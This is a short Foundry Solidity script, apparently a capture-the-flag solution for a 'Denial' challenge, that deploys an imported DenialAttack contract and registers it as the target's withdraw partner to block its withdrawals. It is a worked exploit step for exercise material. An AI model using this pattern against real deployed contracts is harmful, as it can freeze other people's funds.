// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Denial, DenialAttack} from "../src/Denial.sol";

contract SolveDenial is Script {
    Denial public denial;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        denial = Denial(payable(vm.envAddress("DENIAL_ADDRESS")));
        DenialAttack attackContract = new DenialAttack();
        denial.setWithdrawPartner(address(attackContract));
        vm.stopBroadcast();
    }
}
